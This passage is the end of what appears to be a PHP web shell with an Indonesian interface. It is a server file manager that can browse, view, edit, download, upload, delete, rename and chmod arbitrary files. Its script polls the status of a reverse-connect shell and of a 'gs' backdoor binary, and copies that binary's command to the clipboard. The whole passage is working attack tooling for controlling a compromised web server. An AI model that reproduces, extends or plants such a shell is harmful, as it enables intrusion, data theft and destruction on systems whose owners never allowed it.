            <a class="btn btn-yellow" href="?download=<?php echo urlencode($view); ?>">Download</a>
        </div>
    </div>
<?php } elseif ($edit != '' && @is_file($edit)) { ?>
    <div class="box">
        <div class="name">Edit File: <?php echo h($edit); ?></div>
        <div class="muted" style="margin:8px 0 12px 0;">
            Size: <?php echo h(format_size(@filesize($edit))); ?> |
            Owner: <?php echo h(fowner_name($edit)); ?> |
            Group: <?php echo h(fgroup_name($edit)); ?> |
            Perm: <?php echo h(perms($edit)); ?>
        </div>
        <form method="post">
            <input type="hidden" name="action" value="save_file">
            <input type="hidden" name="path" value="<?php echo h(dirname($edit)); ?>">
            <input type="hidden" name="file" value="<?php echo h($edit); ?>">
            <textarea name="content"><?php echo h(@file_get_contents($edit)); ?></textarea>
            <div style="margin-top:12px;">
                <input type="submit" class="btn btn-green" value="Save File">
                <a class="btn" href="?view=<?php echo urlencode($edit); ?>">View</a>
                <a class="btn" href="?path=<?php echo urlencode(dirname($edit)); ?>">Back</a>
                <a class="btn btn-yellow" href="?download=<?php echo urlencode($edit); ?>">Download</a>
            </div>
        </form>
    </div>
<?php } else { ?>
    <div class="box">
        <table class="grid">
            <tr>
                <td>
                    <div class="name">Buat File Baru</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_file">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create File"></div>
                    </form>
                </td>
                 <td>
                    <div class="name">Buat Folder Baru</div>
                    <form method="post" style="margin-top:10px;">
                        <input type="hidden" name="action" value="new_folder">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="text" name="name">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Create Folder"></div>
                    </form>
                 </td>
                 <td>
                    <div class="name">Upload File</div>
                    <form method="post" enctype="multipart/form-data" style="margin-top:10px;">
                        <input type="hidden" name="action" value="upload">
                        <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                        <input type="file" name="upfile">
                        <div style="margin-top:10px;"><input type="submit" class="btn btn-green" value="Upload"></div>
                    </form>
                 </td>
             </tr>
         </table>
    </div>

    <div class="box">
        <div class="name">Isi Folder</div>
        <div style="margin-top:10px;">
            <table>
                <tr>
                    <th>Nama</th>
                    <th width="70">Tipe</th>
                    <th width="90">Size</th>
                    <th width="140">Modified</th>
                    <th width="70">Perm</th>
                    <th width="90">Owner</th>
                    <th width="90">Group</th>
                    <th width="260">Quick</th>
                    <th width="170">Rename / CHMOD</th>
                </tr>
                <?php
                $items = @scandir($cwd_real);
                $n = 0;
                if (is_array($items)) {

                    $dirs = array();
                    $files = array();

                    foreach ($items as $item) {
                        if ($item == '.' || $item == '..') continue;

                        $full = $cwd_real . '/' . $item;

                        if (@is_dir($full)) {
                            $dirs[] = $item;
                        } else {
                            $files[] = $item;
                        }
                    }

                    natcasesort($dirs);
                    natcasesort($files);

                    $sorted = array_merge($dirs, $files);

                    foreach ($sorted as $item) {
                        $full = $cwd_real . '/' . $item;
                        $is_dir = @is_dir($full);
                        $mtime = @filemtime($full);
                        $modified = $mtime ? gmdate('Y-m-d H:i:s', $mtime) : '-';
                        $perm_text = perms_string($full);
                        $perm_class = @is_writable($full) ? 'perm-green' : 'perm-white';
                        $item_size = $is_dir ? '-' : format_size(@filesize($full));
                        $item_perm = perms($full);
                        $item_owner = fowner_name($full);
                        $item_group = fgroup_name($full);
                        $item_ext = $is_dir ? 'dir' : file_ext($full);
                        $n++;
                ?>
                <tr>
                    <td>
                        <?php
                        if ($is_dir) {
                            $name_class = 'dir';
                        } else {
                            $name_class = 'name';
                        }
                        ?>
                        <?php if ($is_dir) { ?>
                            <span class="dir">[DIR]</span>
                            <a class="<?php echo $name_class; ?>" href="?path=<?php echo urlencode($full); ?>"><?php echo h($item); ?></a>
                        <?php } else { ?>
                            <span class="file">[FILE]</span>
                            <span class="hoverbox">
                                <span class="<?php echo $name_class; ?>"><?php echo h($item); ?></span>
                                <span class="previewbox">
                                    <?php if (is_image_file($full)) { ?>
                                        <img src="?img=<?php echo urlencode($full); ?>" alt="">
                                    <?php } ?>
                                    <div class="miniinfo">
                                        <div class="row"><b>Name:</b> <?php echo h($item); ?></div>
                                        <div class="row"><b>Ext:</b> <?php echo h($item_ext); ?></div>
                                        <div class="row"><b>Size:</b> <?php echo h($item_size); ?></div>
                                        <div class="row"><b>Modified:</b> <?php echo h($modified); ?></div>
                                        <div class="row"><b>Perm:</b> <?php echo h($item_perm); ?></div>
                                        <div class="row"><b>Owner:</b> <?php echo h($item_owner); ?></div>
                                        <div class="row"><b>Group:</b> <?php echo h($item_group); ?></div>
                                        <div class="row"><b>Path:</b> <?php echo h($full); ?></div>
                                    </div>
                                </span>
                            </span>
                        <?php } ?>
                    </td>
                    <td><?php echo $is_dir ? 'DIR' : 'FILE'; ?></td>
                    <td><?php echo $is_dir ? '-' : h(format_size(@filesize($full))); ?></td>
                    <td><?php echo h($modified); ?></td>
                    <td><span class="<?php echo $perm_class; ?>"><?php echo h($perm_text); ?></span></td>
                    <td><?php echo h(fowner_name($full)); ?></td>
                    <td><?php echo h(fgroup_name($full)); ?></td>
                    <td class="quick">
                        <?php if (!$is_dir) { ?>
                            <a class="btn" href="?view=<?php echo urlencode($full); ?>">View</a>
                            <a class="btn btn-green" href="?edit=<?php echo urlencode($full); ?>">Edit</a>
                            <a class="btn btn-yellow" href="?download=<?php echo urlencode($full); ?>">Download</a>
                        <?php } else { ?>
                            <a class="btn" href="?path=<?php echo urlencode($full); ?>">Open</a>
                        <?php } ?>
                        <form method="post" style="display:inline;" onsubmit="return confirm('Yakin hapus?');">
                            <input type="hidden" name="action" value="delete">
                            <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                            <input type="hidden" name="target" value="<?php echo h($full); ?>">
                            <input type="submit" class="btn btn-red" value="Delete">
                        </form>
                    </td>
                    <td>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="action" value="rename">
                            <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                            <input type="hidden" name="old" value="<?php echo h($full); ?>">
                            <input type="text" name="new" value="<?php echo h($item); ?>" style="width:82px;">
                            <input type="submit" class="btn" value="Rename">
                        </form>
                        <form method="post" style="display:inline;">
                            <input type="hidden" name="action" value="chmod">
                            <input type="hidden" name="path" value="<?php echo h($cwd_real); ?>">
                            <input type="hidden" name="target" value="<?php echo h($full); ?>">
                            <input type="text" class="small-input" name="mode" value="<?php echo h(perms($full)); ?>">
                            <input type="submit" class="btn" value="Chmod">
                        </form>
                    </td>
                </tr>
                <?php
                    }
                }
                if ($n == 0) {
                    echo '<tr><td colspan="9">Folder kosong</td></tr>';
                }
                ?>
            </table>
        </div>
    </div>
<?php } ?>
</div>
<script>
function setCmd(cmd) { document.getElementById('cmd').value = cmd; }
function rctPoll() {
    var out = document.getElementById('rct-out');
    var st  = document.getElementById('rct-status');
    if (!out) return;
    var x = new XMLHttpRequest();
    x.open('GET', '?shell_poll=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            if (x.status === 200) {
                out.textContent = x.responseText;
                st.textContent = x.responseText.indexOf('[alive] yes') > -1 ? 'running' : 'stopped';
            } else {
                out.textContent = 'poll error: HTTP ' + x.status;
            }
        }
    };
    x.send(null);
}
function gsPoll() {
    var out = document.getElementById('gs-out');
    var st  = document.getElementById('gs-status');
    var cmd = document.getElementById('gs-cmd');
    if (!out) return;
    var x = new XMLHttpRequest();
    x.open('GET', '?gs_poll=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState === 4) {
            if (x.status === 200) {
                var t = x.responseText;
                out.textContent = t;
                var a = t.indexOf('[alive] yes') > -1;
                var b = t.indexOf('[binary] present') > -1;
                st.textContent = !b ? 'no binary' : (a ? 'running' : 'stopped');
                var m = t.match(/\[command\]\s*(.+)/);
                if (m && cmd) cmd.value = m[1].trim();
            } else {
                out.textContent = 'poll error: HTTP ' + x.status;
            }
        }
    };
    x.send(null);
}
function copyGsCmd() {
    var e = document.getElementById('gs-cmd');
    if (!e || !e.value) return;
    e.select();
    e.setSelectionRange(0, 99999);
    try { document.execCommand('copy'); } catch (x) {}
    if (navigator.clipboard) navigator.clipboard.writeText(e.value).catch(function(){});
}
function fmtSize(s) {
    if (!s || isNaN(s)) return '-';
    if (s >= 1073741824) return (s/1073741824).toFixed(2) + ' GB';
    if (s >= 1048576)    return (s/1048576).toFixed(2) + ' MB';
    if (s >= 1024)       return (s/1024).toFixed(2) + ' KB';
    return s + ' B';
}
function statPoll() {
    var x = new XMLHttpRequest();
    x.open('GET', '?stats=1&_=' + (+new Date()), true);
    x.onreadystatechange = function() {
        if (x.readyState !== 4 || x.status !== 200) return;
        var d;
        try { d = JSON.parse(x.responseText); } catch(e) { return; }
        var up = document.getElementById('stat-uptime');
        if (up) up.textContent = d.uptime_h;
        var ram = document.getElementById('stat-ram');
        if (ram) ram.textContent = fmtSize(d.mem_avail * 1024);
        var ramt = document.getElementById('stat-ram-total');
        if (ramt) ramt.textContent = fmtSize(d.mem_total * 1024);
        var ramp = document.getElementById('stat-ram-pct');
        if (ramp) {
            ramp.textContent = '(' + d.mem_pct + '% used)';
            ramp.style.color = d.mem_pct > 90 ? '#ff7b72' : (d.mem_pct > 70 ? '#e3b341' : '#8e99ab');
        }
        var dsk = document.getElementById('stat-disk');
        if (dsk) dsk.textContent = fmtSize(d.disk_free);
        var dskt = document.getElementById('stat-disk-total');
        if (dskt) dskt.textContent = fmtSize(d.disk_total);
        var dskp = document.getElementById('stat-disk-pct');
        if (dskp) {
            dskp.textContent = '(' + d.disk_pct + '% used)';
            dskp.style.color = d.disk_pct > 90 ? '#ff7b72' : (d.disk_pct > 70 ? '#e3b341' : '#8e99ab');
        }
        var ld = document.getElementById('stat-load');
        if (ld) ld.textContent = d.load;
    };
    x.send(null);
}
statPoll();
setInterval(statPoll, 1500);
<?php if ($tab === 'gs'): ?>
gsPoll();
setInterval(gsPoll, 3000);
<?php endif; ?>
<?php if ($tab === 'shell'): ?>
rctPoll();
setInterval(rctPoll, 3000);
<?php endif; ?>
</script>
</body>
</html>
